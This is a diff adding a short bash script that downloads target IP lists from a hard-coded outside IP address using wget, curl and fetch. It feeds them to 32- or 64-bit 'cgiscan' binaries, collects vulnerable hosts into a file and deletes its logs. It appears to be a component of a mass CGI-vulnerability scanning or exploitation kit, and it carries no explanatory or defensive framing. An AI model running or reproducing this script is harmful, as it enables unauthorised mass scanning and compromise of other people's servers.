@@ -1,0 +1,27 @@
+#!/bin/bash
+############### Config ###############
+rm -rf scan.log
+rm -rf vuln-ip.txt
+
+wget http://109.228.25.87/.ips-80/$1
+curl -O http://109.228.25.87/.ips-80//$1
+fetch http://109.228.25.87/.ips-80/$1
+
+cat $1* |sort -u >> scan.log
+rm -rf $1*
+sleep 1
+
+
+if [ `getconf LONG_BIT` = "64" ]
+then
+./cgiscan64 scan.log v 50 patch
+else
+./cgiscan32 scan.log v 50 patch
+fi
+
+sleep 60
+rm -rf t.log
+cat vuln-ip.txt | sort -u >t.log
+sleep 4
+./print
+
